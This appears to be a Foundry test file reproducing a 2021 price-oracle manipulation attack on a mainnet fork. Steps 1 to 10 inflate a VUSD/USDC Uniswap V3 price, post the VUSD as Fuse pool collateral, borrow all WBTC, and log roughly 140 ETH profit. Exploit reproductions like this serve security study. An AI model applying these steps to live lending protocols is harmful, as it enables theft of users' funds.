// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "src/Attacker.sol";

/*
# Post Mortems
https://twitter.com/jai_bhavnani/status/1455598838433992704
https://twitter.com/Mudit__Gupta/status/1455627465678749696
# TX:
Manipulation: https://etherscan.io/tx/0x89d0ae4dc1743598a540c4e33917efdce24338723b0fabf34813b79cb0ecf4c5
Deposit & Borrow: https://etherscan.io/tx/0x8527fea51233974a431c92c4d3c58dee118b05a3140a04e0f95147df9faf8092
V3 Position: https://opensea.io/assets/0xc36442b4a4522e871399cd717abdd847ab11fe88/148496
Attacker contract: 0x7993e1d66ffb1ab3fb1cb3db87219f532c25bdc8
# Code:
fuse-VUSD: (fVUSD-23) https://etherscan.io/address/0x2914e8c1c2c54e5335dc9554551438c59373e807#code (deposit)
fuse-WBTC: (fVUSD-23) https://etherscan.io/address/0x0302f55dc69f5c4327c8a6c3805c9e16fc1c3464 (borrow)
Minter.sol (USDC to VUSD): https://etherscan.io/address/0xb652fc42e12828f3f1b3e96283b199e62ec570db#code
*/

contract AttackerTest is Test {
    uint256 mainnetFork;

    string mainnetRpcUrl = vm.envString("MAINNET_RPC_URL");

    uint256 constant FIRST_TX_BLOCK = 13537922;
    uint256 constant SECOND_TX_BLOCK = 13537933;

    uint32 constant TWAP_SECONDS_AGO = 600 seconds;
    uint32 constant AVG_BLOCK_TIME = 13 seconds;

    address attackerEOA = address(0x12345);

    Attacker attacker;

    function setUp() public {
        mainnetFork = vm.createFork(mainnetRpcUrl);
        vm.selectFork(mainnetFork);
        vm.rollFork(FIRST_TX_BLOCK - 1);
        vm.roll(FIRST_TX_BLOCK);

        attacker = new Attacker();
    }

    function testSetUp() public {
        assertEq(vm.activeFork(), mainnetFork);
        assertEq(block.number, FIRST_TX_BLOCK);
    }

    function testPrintUniswapTwapPrice() public {
        while (block.number < SECOND_TX_BLOCK) {
            uint256 blockNumber = block.number;
            uint256 currentPrice = attacker.getUniswapCurrentPrice();
            uint256 twapPrice = attacker.getUniswapTwapPrice(TWAP_SECONDS_AGO);

            console.log("--- Block", blockNumber);
            console.log("  Current Price:", currentPrice);
            console.log("  TWAP Price:", twapPrice);

            vm.roll(++blockNumber);
        }
    }

    function testPrintUniswapTwapPriceWithManipulation() public {
        vm.startPrank(attackerEOA);
        vm.deal(attackerEOA, 1000 ether);

        attacker.buyUSDC{value: 1000 ether}();

        console.log("=== Current price before swap ===");
        console.log("  Current Price:", attacker.getUniswapCurrentPrice());

        attacker.buyAllVUSD();
        console.log("=== Current price after swap ===");
        console.log("  Current Price:", attacker.getUniswapCurrentPrice());

        while (block.number < SECOND_TX_BLOCK) {
            uint256 blockNumber = block.number;
            uint256 currentPrice = attacker.getUniswapCurrentPrice();
            uint256 twapPrice = attacker.getUniswapTwapPrice(TWAP_SECONDS_AGO);

            console.log("--- Block", blockNumber);
            console.log("  Current Price:", currentPrice);
            console.log("  TWAP Price:", twapPrice);

            vm.roll(++blockNumber);
            vm.warp(block.timestamp + AVG_BLOCK_TIME);
        }
    }

    function testPriceManipulationAndHack() public {
        vm.startPrank(attackerEOA);
        vm.deal(attackerEOA, 1000 ether);

        uint256 startingBalance = attackerEOA.balance;
        console.log("Starting Balance:", startingBalance);

        //////////////////////////////////
        /// *** Price manipulation *** ///
        //////////////////////////////////

        // first step of attacker is to manipulate the VUSD <> USDC UniswapV3 pool price
        console.log("Start price manupulation");

        // https://ethtx.info/mainnet/0x89d0ae4dc1743598a540c4e33917efdce24338723b0fabf34813b79cb0ecf4c5/
        // 1. buy 250k USDC with WETH
        attacker.buyUSDC{value: 1000 ether}();

        // Turns out these two steps are not needed, when buying up all VUSD, it automatically ends up at MAX_TICK
        // 2. Get a small amount of VUSD (exploiter did this through minter but we can just do a first small swap)
        // 3. Create LP position at max tick

        // 4. Perform the swap such that we burn through the range orders up to our position at max tick
        attacker.buyAllVUSD();

        // 5. the hacker waited til block 13537933 to perform the attack on fuse, ~ 10 blocks (2m10s) after the manipulation
        while (block.number < SECOND_TX_BLOCK) {
            uint256 blockNumber = block.number;

            vm.roll(++blockNumber);
            vm.warp(block.timestamp + AVG_BLOCK_TIME);
        }

        require(block.number == SECOND_TX_BLOCK);

        //////////////////////
        /// *** Attack *** ///
        //////////////////////

        // second step of the attack where we deposit price-inflated VUSD as collateral
        // and borrow other fuse assets
        console.log("Start attack");

        // 6. enter fVUSD market such that it is counted as collateral
        attacker.enterFuseMarket();

        // 7. deposit 4M$ VUSD as collateral
        attacker.depositVusdcCollateral();

        // 8. borrow all WBTC, could go on and borrow other tokens in fuse pool 23
        attacker.borrowWbtc();

        // 9. swap the WBTC into ETH for profit
        attacker.swapWbtcToWeth();

        // 10. withdraw the ETH
        attacker.refundWETH();

        // profit here is ~140 ETH
        uint256 finalBalance = attackerEOA.balance;
        console.log("Final Balance:", finalBalance);

        console.log("Profit:", finalBalance - startingBalance);
    }
}
